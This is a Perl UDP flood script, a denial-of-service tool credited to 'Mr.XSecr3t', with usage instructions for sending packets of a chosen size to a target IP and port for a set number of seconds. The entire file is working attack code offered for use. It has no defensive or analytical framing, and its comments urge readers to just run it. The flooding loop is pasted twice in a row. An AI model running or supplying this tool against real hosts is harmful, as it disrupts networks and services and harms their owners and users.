#!/usr/bin/perl

#Improved UDP Flood Script
#
# I found a copy of DgH.pl which took me around to looking at the code
# Turns out the script only sent out a 5-byte attack with the string "flood"
# This script is developed to send the packets you actually want to send
# E.g 5 = "#####" or 10 = "##########"
#
# Usage: perl XSFlood.pl IP PORT BYTE TIME
# Example: perl XSFlood.pl 1.1.1.1 80 150 500
# (Sends attack to 1.1.1.1 on port 80 with 150 byte for 500 seconds)
#
# Why are you still reading? Just use the script.
#
# For the linux skids:
# CentOS Perl install: yum install perl
# Debian Perl install: apt-get install perl
#
# Note: Please don't get too carried away with the byte's
# It may cause failure in the UDP Flood (Recommended max: 40000)
#
# Need any help? find me on twitter/facebook
#

use Socket;

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
my $packetstring = '#' x $size;
$iaddr = inet_aton("$ip") or die "Invalid IP\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "UDP Flood Script developed by Mr.XSecr3t\n";
print "Sent attack to $ip " . ($port ? $port : "random") . " with " .
($size ? "$size-byte" : "that good-good") . " " .
($time ? "for $time seconds" : "") . "\n";

for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize",$packetstring), 0, pack_sockaddr_in($pport,$iaddr));}for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize",$packetstring), 0, pack_sockaddr_in($pport,
$iaddr));}